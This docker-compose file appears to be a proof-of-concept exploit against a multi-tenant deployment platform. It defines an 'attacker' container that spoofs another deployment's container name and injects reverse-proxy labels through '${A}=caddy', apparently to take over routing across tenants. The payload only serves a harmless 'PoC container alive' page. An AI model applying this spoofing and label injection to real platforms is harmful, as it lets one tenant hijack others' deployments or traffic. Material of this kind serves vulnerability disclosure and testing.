services:
  attacker:
    image: alpine
    command: ["sh", "-c", "mkdir /www && echo 'PoC container alive | container_name=111c4266-47a4-41b1-adcb-185fed196c91_00000000-fake-deploy-cross-tenant-poc | label=${A}=caddy' > /www/index.html && httpd -f -p 8080 -h /www"]
    container_name: 111c4266-47a4-41b1-adcb-185fed196c91_00000000-fake-deploy-cross-tenant-poc
    ports:
      - "8080:8080"
    labels:
      - "${A}=caddy"
    healthcheck:
      test: ["CMD-SHELL", "exit 1"]
      interval: 30s
      timeout: 5s
      retries: 3
      start_period: 120s
